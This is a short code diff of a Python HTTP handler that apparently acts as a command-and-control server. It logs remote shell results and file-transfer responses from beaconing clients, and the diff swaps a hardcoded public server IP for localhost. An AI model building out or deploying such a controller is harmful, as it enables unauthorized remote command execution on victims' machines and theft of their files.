@@ -234,7 +234,6 @@ class HTTPHandler(TypeTable, BaseHTTPRequestHandler):
                 self._becon_ack_response()
         elif parsed_data['type'] == 'SHELL_RESPONSE': # SHELL_RESPONSE
             self.print_log('[*] execute result\n{}'.format(parsed_data['data'].decode(ENCODING)))
-            # print('[*] execute result\n{}'.format(parsed_data['data'].decode(ENCODING)))
             self._becon_ack_response()
         elif parsed_data['type'] == 'FTP_RESPONSE':
             if len(FILE_NAME_LIST[client_ip]) > 0 and parsed_data['sequence'] == 0:
@@ -259,7 +258,7 @@ LOG_PRINT = False
 
 # 서버 주소와 포트
 # 자신의 ip, port로 설정
-SERVER_INFO = ('1.251.227.66', 80)
+SERVER_INFO = ('127.0.0.1', 80)
 
 # encoding
 ENCODING = 'cp949'
